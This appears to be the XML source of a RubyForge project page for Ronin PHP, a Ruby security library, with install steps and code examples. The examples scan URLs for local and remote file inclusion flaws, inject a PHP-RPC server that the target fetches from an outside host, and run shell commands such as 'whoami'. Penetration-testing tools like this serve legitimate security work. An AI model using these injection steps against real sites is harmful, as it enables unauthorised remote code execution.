<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="../../xsl/page.xsl"?>
<!--
  ronin.rubyforge.org.

  Copyright (c) 2006-2009 Hal Brodigan (postmodern.mod3 at gmail.com)

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
-->

<rubyforge xmlns:xi="http://www.w3.org/2001/XInclude">
  <title>Ronin PHP</title>

  <page>
    <xi:include href="../_menu.xml" />

    <content>
      <section label="ronin_php" title="Ronin PHP">
        <p>
          Ronin PHP is a Ruby library for Ronin that provides support for
          PHP related security tasks.
        </p>

        <xi:include href="../_description.xml" />
      </section>

      <section label="features" title="Features">
        <list>
          <item>
            Provides tests for Location File Inclusion (LFI) and Remote
            File Inclusion (RFI) that are built into the URI::HTTP class.
          </item>

          <item>
            Allows for effortless finger-printing of a web-server using LFI.
          </item>

          <item>
            Provides a PHP-RPC client and server that are designed to work
            in hostile environments.
          </item>

          <item>Provides an AJAX PHP-RPC Console.</item>
        </list>
      </section>

      <section label="requirements" title="Requirements">
        <list>
          <item>
            <a href="/index.html">Ronin</a> &gt;= 0.0.9
          </item>

          <item>
            <a href="http://rubyforge.org/frs/?group_id=5440&amp;release_id=25118">cssmin</a>
          </item>

          <item>
            <a href="http://rubyforge.org/frs/?group_id=5440&amp;release_id=20432">jsmin</a>
          </item>
        </list>
      </section>

      <section label="install" title="Install">
        <shell>$ sudo gem install ronin-php</shell>
      </section>

      <section label="synopsis" title="Synopsis">
        <list>
          <item>
            Start the Ronin console with Ronin PHP preloaded:
            <shell>$ ronin-php</shell>
          </item>
        </list>
      </section>

      <section label="examples" title="Examples">
        <list>
          <item>
            Test for Remote File Inclusion (RFI):
            <code>require 'ronin/php/rfi'

url = URI('http://www.example.com/page.php?lang=en')
url.has_rfi?
# =&gt; true</code>
          </item>

          <item>
            Get the first viable RFI vulnerability:
            <code>url.first_rfi
# =&gt; #&lt;Ronin::PHP::RFI: ...&gt;</code>
          </item>

          <item>
            Scan a URL for RFI vulnerabilities:
            <code>url.rfi_scan
# =&gt; [#&lt;Ronin::PHP::RFI: ...&gt;, ...]</code>
          </item>

          <item>
            Inject a PHP-RPC Server into a RFI vulnerable URL:
            <code>require 'ronin/rpc/php'

client = url.rfi.rpc
client.exec('whoami')
# =&gt; "www-data"</code>
          </item>

          <item>
            Get a direct URL to the AJAX interface of the PHP-RPC Server:
            <code>client.url
# => "http://www.example.com/page.php?en=http://ronin.rubyforge.org/static/ronin/php/rpc/server.min.php?"</code>
          </item>

          <item>
            Test for Local File Inclusion (LFI):
            <code>require 'ronin/php/lfi'

url = URI('http://www.example.com/site.php?page=home')
url.has_lfi?
# =&gt; true</code>
          </item>

          <item>
            Get the first viable LFI vulnerability:
            <code>url.first_lfi
# =&gt; #&lt;Ronin::PHP::LFI: ...&gt;</code>
          </item>

          <item>
            Scan a URL for LFI vulnerabilities:
            <code>url.lfi_scan
# =&gt; [#&lt;Ronin::PHP::LFI: ...&gt;, ...]</code>
          </item>
        </list>
      </section>

      <section label="development" title="Development">
        <list>
          <item>
            <a href="http://ronin.rubyforge.org/docs/ronin-php/">
              API Documentation
            </a>
          </item>

          <item>
            <a href="http://github.com/postmodern/ronin-php/tree/master">
              Source Code
            </a>
          </item>

          <item>
            <a href="http://github.com/postmodern/ronin-php/issues">
              Issue Tracker
            </a>
          </item>
        </list>
      </section>
    </content>
  </page>
</rubyforge>
